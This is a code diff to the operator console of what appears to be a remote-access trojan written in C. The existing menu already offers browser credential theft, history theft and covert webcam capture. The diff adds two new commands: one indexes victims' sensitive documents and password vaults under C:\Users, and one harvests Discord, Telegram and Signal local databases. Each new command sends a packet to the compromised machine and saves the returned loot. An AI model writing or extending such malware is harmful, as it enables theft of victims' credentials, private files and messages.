@@ -260,6 +260,8 @@ static void display_prompt(int persistence)
     printf(" 13 - CRED_STEAL                 Harvest browser credentials\n");
     printf(" 14 - HISTORY_STEAL              Harvest browser history\n");
     printf(" 15 - CAMERA_SNAPSHOT            Capture webcam photo [HIGH RISK: triggers camera indicator light on target]\n");
+    printf(" 16 - FILE_SEARCH                Index sensitive files (.docx .pdf .kdbx .xlsx) under C:\\Users\\\n");
+    printf(" 17 - MESSAGING_STEAL            Harvest Discord, Telegram & Signal local databases\n");
     printf("> ");
     fflush(stdout);
 }
@@ -277,9 +279,9 @@ static int console_input(int persistence)
         if (strchr(input_buffer, '\n') == NULL)
             flush_stdin();
         if (sscanf(input_buffer, "%d", &choice) == 1 &&
-            choice >= 0 && choice <= 15)
+            choice >= 0 && choice <= 17)
             break;
-        printf("INVALID INPUT! Please enter an integer from 0-15.\n");
+        printf("INVALID INPUT! Please enter an integer from 0-17.\n");
     }
     return choice;
 }
@@ -535,6 +537,40 @@ static void run_command_loop(int slot)
             Packet *resp = recieve_packet(conn);
             if (resp && resp->command_type == COMMAND_RESPONSE) {
                 handle_camera_snapshot_response(resp, save_dir);
+                free_packet(resp);
+            } else {
+                if (process_response(resp, s->request_id, conn) == -1)
+                    connected = 0;
+            }
+            break;
+        }
+
+        case 16: { /* FILE_SEARCH */
+            printf("<Indexing sensitive files under C:\\Users\\...>\n\n");
+            fflush(stdout);
+            s->request_id++;
+            Packet pkt = {COMMAND_FILE_SEARCH, s->request_id, 0, NULL};
+            send_packet(&pkt, conn);
+            Packet *resp = recieve_packet(conn);
+            if (resp && resp->command_type == COMMAND_RESPONSE) {
+                handle_file_search_response(resp, save_dir);
+                free_packet(resp);
+            } else {
+                if (process_response(resp, s->request_id, conn) == -1)
+                    connected = 0;
+            }
+            break;
+        }
+
+        case 17: { /* MESSAGING_STEAL */
+            printf("<Harvesting Discord, Telegram & Signal data...>\n\n");
+            fflush(stdout);
+            s->request_id++;
+            Packet pkt = {COMMAND_MESSAGING_STEAL, s->request_id, 0, NULL};
+            send_packet(&pkt, conn);
+            Packet *resp = recieve_packet(conn);
+            if (resp && resp->command_type == COMMAND_RESPONSE) {
+                handle_messaging_steal_response(resp, save_dir);
                 free_packet(resp);
             } else {
                 if (process_response(resp, s->request_id, conn) == -1)
